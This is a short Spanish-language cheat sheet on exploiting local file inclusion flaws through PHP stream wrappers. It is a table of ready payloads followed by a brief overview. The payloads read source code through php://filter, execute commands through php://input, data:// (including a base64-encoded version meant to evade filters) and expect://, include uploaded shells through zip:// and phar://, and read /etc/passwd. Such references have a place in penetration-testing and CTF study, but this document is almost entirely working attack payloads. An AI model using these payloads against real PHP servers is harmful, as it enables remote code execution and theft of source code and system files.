---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# LFI - PHP Wrappers

***

## Cheatsheet

| **Técnica**                     | **Descripción**                                                                      | **Payload**                                                     |
| ------------------------------- | ------------------------------------------------------------------------------------ | --------------------------------------------------------------- |
| <br>php://filter base64<br><br> | <br><br>Leer código fuente encodeado en base64<br><br>                               | <br><br>`php://filter/convert.base64-encode/resource=index.php` |
| <br>php://filter rot13          | <br>Leer código fuente encodeado en ROT13<br><br>                                    | <br>`php://filter/string.rot13/resource=config.php`             |
| <br>php://input                 | <br>Inyectar código PHP directamente desde el body del request<br><br>               | <br>`php://input` + POST: `<?php system('id'); ?>`              |
| <br>data://                     | <br>Inyectar código inline como si fuera un archivo<br><br>                          | <br>`data://text/plain,<?php system('id'); ?>`                  |
| <br>data:// base64              | <br>Lo mismo pero encodeado en base64 para evadir filtros<br><br>                    | <br>`data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` |
| <br>expect://                   | <br>Ejecutar comandos directamente (requiere extensión expect)<br><br>               | <br>`expect://id`                                               |
| <br>zip://                      | <br>Incluir un archivo dentro de un ZIP subido al servidor<br><br>                   | <br>`zip:///tmp/shell.zip%23shell.php`                          |
| <br>phar://                     | <br>Incluir un archivo dentro de un PHAR subido<br><br>                              | <br>`phar:///tmp/shell.phar/shell.php`                          |
| <br>php://filter chain          | <br>Encadenar múltiples filtros de conversión para generar output arbitrario<br><br> | <br>`php://filter/convert.iconv.UTF8.CSISO2022KR/...`           |
| <br>file://                     | <br>Wrapper explícito para archivos locales<br><br>                                  | <br>`file:///etc/passwd`                                        |


***

## Overview

PHP ofrece stream wrappers que permiten acceder a distintos tipos de recursos como si fueran archivos. Cuando un LFI usa funciones como `include()` o `file_get_contents()`, estos wrappers amplían enormemente el alcance del ataque. Con `php://filter` podés leer código fuente sin que se ejecute, con `php://input` y `data://` podés inyectar código directamente, y con `zip://` o `phar://` podés incluir archivos empaquetados que previamente subiste al servidor. La disponibilidad de cada wrapper depende de la configuración de PHP (`allow_url_include`, extensiones instaladas, etc.).


***
